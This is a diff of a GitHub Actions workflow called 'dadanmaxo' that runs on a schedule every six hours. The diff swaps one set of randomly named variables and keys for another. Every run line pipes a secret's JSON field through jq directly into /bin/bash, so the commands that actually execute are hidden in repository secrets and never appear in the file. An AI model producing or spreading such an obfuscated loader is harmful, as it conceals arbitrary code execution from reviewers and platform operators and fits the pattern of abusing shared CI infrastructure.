@@ -2,7 +2,8 @@ name: dadanmaxo
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 5/6 * * *'
+    - cron: '26 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,19 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: dadanmaxo
         env:
-          aqir2364: ${{ secrets.aqir2364 }}
+          dzjn58: ${{ secrets.dzjn58 }}
         run: |
-          echo $aqir2364 | jq -r .it21 | /bin/bash
-          echo $jxja6 | jq -r .vik57094 | /bin/bash
-          echo $otqqi46 | jq -r .zi76 | /bin/bash
-          echo $t73 | jq -r .neo908 | /bin/bash
-          echo $uh6 | jq -r .st7 | /bin/bash
-          echo $th11 | jq -r .wedi902 | /bin/bash
-          echo $ukm17206 | jq -r .xd144 | /bin/bash
-          echo $yp93439 | jq -r .x25738 | /bin/bash
-          echo $u70 | jq -r .r6648 | /bin/bash
-          echo $tpzgf22460 | jq -r .ne15349 | /bin/bash
-          echo $ven7 | jq -r .h1479 | /bin/bash
-          echo $kpgy35 | jq -r .zelt137 | /bin/bash
-          echo $jp12614 | jq -r .itfpc8009 | /bin/bash
+          echo $dzjn58 | jq -r .ufu10371 | /bin/bash
+          echo $tpj94916 | jq -r .vyj92 | /bin/bash
+          echo $xr8 | jq -r .fyojq10 | /bin/bash
+          echo $gknt6548 | jq -r .g45072 | /bin/bash
+          echo $m87583 | jq -r .ulw4096 | /bin/bash
+          echo $wz1050 | jq -r .l6678 | /bin/bash
+          echo $r87 | jq -r .ions4 | /bin/bash
+          echo $ygx294 | jq -r .drudt0867 | /bin/bash
+          echo $ucnyu75875 | jq -r .eib809 | /bin/bash
+          echo $w56777 | jq -r .i1 | /bin/bash
+          echo $ca833 | jq -r .tc3 | /bin/bash
+          echo $xohnv87493 | jq -r .wvgcs428 | /bin/bash
 
